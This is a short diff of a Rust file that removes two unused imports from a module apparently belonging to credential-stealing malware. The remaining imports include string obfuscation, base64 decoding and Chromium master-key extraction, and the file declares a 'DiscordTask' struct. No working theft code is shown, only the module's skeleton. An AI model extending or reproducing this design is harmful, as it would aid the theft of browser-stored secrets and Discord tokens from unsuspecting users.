@@ -1,13 +1,11 @@
 use crate::alloc::borrow::ToOwned;
 use alloc::string::String;
 use alloc::vec::Vec;
-use alloc::{format, vec};
 use obfstr::obfstr as s;
 use tasks::{parent_name, Task};
 use utils::base64::base64_decode;
 use utils::browsers::chromium;
 use utils::browsers::chromium::extract_master_key;
-use utils::log_debug;
 use utils::path::{Path, WriteToFile};
 
 pub(super) struct DiscordTask;
